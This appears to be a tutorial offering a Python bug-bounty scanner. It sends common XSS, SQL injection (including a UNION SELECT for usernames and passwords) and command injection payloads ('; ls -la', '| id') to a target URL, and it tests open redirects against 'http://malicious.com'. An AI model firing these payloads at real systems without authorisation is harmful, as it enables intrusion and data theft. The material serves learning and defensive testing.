This script will cover various types of vulnerabilities such as XSS, SQL Injection, Command Injection, Open Redirect, and Security Misconfigurations using commonly found payloads and checks.
Pre-Requisite:

You can use the following tools for extended vulnerability detection:

    Burp Suite: For automated scanning and advanced attacks.

    OWASP ZAP: For dynamic application security testing (DAST).

    Nikto: For web server scanning.

Here's a Python script that implements checks for various vulnerabilities commonly used by these tools.

import requests
import time
import json

# List of basic XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS Test');</script>",
    "<img src='x' onerror='alert(1);'>",
    "<svg/onload=alert(1)>"
]

# List of SQL Injection payloads
SQL_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT NULL, username, password FROM users --",
    "' AND 1=1 --"
]

# List of Command Injection payloads
CMD_INJECTION_PAYLOADS = [
    "; ls -la",
    "| id",
    "; echo vulnerable"
]

# Function to test for XSS vulnerability
def test_xss(url):
    for payload in XSS_PAYLOADS:
        response = requests.get(url, params={'search': payload})
        if payload in response.text:
            return True, payload
    return False, None

# Function to test for SQL Injection vulnerability
def test_sql_injection(url):
    for payload in SQL_PAYLOADS:
        response = requests.get(url, params={'id': payload})
        if "SQL" in response.text or "error" in response.text:
            return True, payload
    return False, None

# Function to test for Command Injection vulnerability
def test_cmd_injection(url):
    for payload in CMD_INJECTION_PAYLOADS:
        response = requests.get(url, params={'cmd': payload})
        if "vulnerable" in response.text or "uid=" in response.text:
            return True, payload
    return False, None

# Function to check for open redirects
def test_open_redirect(url):
    payload = "http://malicious.com"
    response = requests.get(url, params={'redirect': payload})
    if response.url != url:
        return True, payload
    return False, None

# Function to check for security misconfigurations (simplified check for HTTP security headers)
def test_security_misconfigurations(url):
    response = requests.head(url)
    headers = response.headers

    # Common security headers to check
    required_headers = ['Strict-Transport-Security', 'X-Content-Type-Options', 'X-Frame-Options']
    missing_headers = [header for header in required_headers if header not in headers]

    if missing_headers:
        return True, missing_headers
    return False, None

# Function to generate a report
def generate_report(vulnerability_type, url, payload, success, additional_info=None):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    report = {
        'timestamp': timestamp,
        'vulnerability': vulnerability_type,
        'url': url,
        'payload': payload,
        'success': success,
        'additional_info': additional_info
    }
    return report

# Function to log the report to a file
def log_report(report):
    with open("bug_bounty_reports.json", "a") as file:
        json.dump(report, file)
        file.write("\n")

# Main function to execute the testing and logging
def main():
    target_url = "http://example.com/vulnerable-page"
    
    # Test for XSS vulnerability
    xss_success, xss_payload = test_xss(target_url)
    xss_report = generate_report("XSS", target_url, xss_payload, xss_success)
    log_report(xss_report)

    # Test for SQL Injection vulnerability
    sql_injection_success, sql_payload = test_sql_injection(target_url)
    sql_injection_report = generate_report("SQL Injection", target_url, sql_payload, sql_injection_success)
    log_report(sql_injection_report)

    # Test for Command Injection vulnerability
    cmd_injection_success, cmd_payload = test_cmd_injection(target_url)
    cmd_injection_report = generate_report("Command Injection", target_url, cmd_payload, cmd_injection_success)
    log_report(cmd_injection_report)

    # Test for Open Redirect vulnerability
    open_redirect_success, redirect_payload = test_open_redirect(target_url)
    open_redirect_report = generate_report("Open Redirect", target_url, redirect_payload, open_redirect_success)
    log_report(open_redirect_report)

    # Test for Security Misconfigurations (e.g., missing HTTP headers)
    misconfig_success, missing_headers = test_security_misconfigurations(target_url)
    misconfig_report = generate_report("Security Misconfiguration", target_url, missing_headers, misconfig_success, missing_headers)
    log_report(misconfig_report)

    print("Testing complete. Reports have been generated.")

if __name__ == "__main__":
    main()

How the Script Works:

    Test for XSS (Cross-site Scripting):

        The script tests for multiple XSS payloads. If the payload is reflected back in the response (without sanitization), it indicates an XSS vulnerability.

    Test for SQL Injection:

        Common SQL injection payloads are sent in URL parameters. The script looks for common SQL error messages or database anomalies.

    Test for Command Injection:

        The script injects common command injection payloads and checks for signs of successful command execution (e.g., outputs like uid=).

    Test for Open Redirect:

        The script tests for open redirects by attempting to redirect the user to an external site (e.g., http://malicious.com). If the URL is changed, it indicates an open redirect vulnerability.

    Test for Security Misconfigurations:

        The script sends a HEAD request and checks for missing HTTP security headers like Strict-Transport-Security and X-Content-Type-Options, which help prevent common attacks.

    Report Generation:

        The script generates a report in JSON format, including the timestamp, vulnerability type, payload used, success flag, and additional info if applicable.

Example of Generated Report:

{
    "timestamp": "2025-04-22 14:30:12",
    "vulnerability": "XSS",
    "url": "http://example.com/vulnerable-page",
    "payload": "<script>alert('XSS Test');</script>",
    "success": true,
    "additional_info": null
}

How to Use:

    Modify the target_url variable to point to the web application you're testing.

    The script will test for multiple common vulnerabilities (XSS, SQL Injection, Command Injection, Open Redirect, and Security Misconfigurations).

    Reports are saved in a JSON file (bug_bounty_reports.json).

    Analyze the generated reports to identify and fix security issues in the target web application.

Next Steps:

    You can integrate more advanced payloads from Burp Suite or OWASP ZAP using their API to automate scanning.

    You could add a feature to automate interaction with Nikto or similar tools for scanning specific vulnerabilities like misconfigurations, outdated software, etc.
